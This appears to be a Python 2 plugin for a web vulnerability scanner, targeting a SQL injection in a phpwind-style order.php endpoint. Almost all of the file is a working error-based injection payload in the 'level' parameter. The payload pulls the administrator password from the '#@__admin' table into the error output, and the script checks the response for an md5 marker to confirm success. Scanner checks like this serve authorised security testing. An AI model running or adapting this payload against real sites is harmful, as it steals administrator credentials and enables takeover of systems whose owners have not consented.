#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "order.php?action=getarea&level=1%20%20or%20@`\’`=1%20and%20(SELECT%201%20FROM%20(select%20count(*),concat(floor(rand(0)*2),0x7e,(substring((Select%20concat(md5(3333),0x7e,password)%20from%20`%23@__admin`),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%20and%20@`\’`=0%23"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if content.find('2be9bd7a3434f7038ca27d1918de58bd1')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:phpwind_order.phpSqlInjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
    #end try
    
    return list
#end def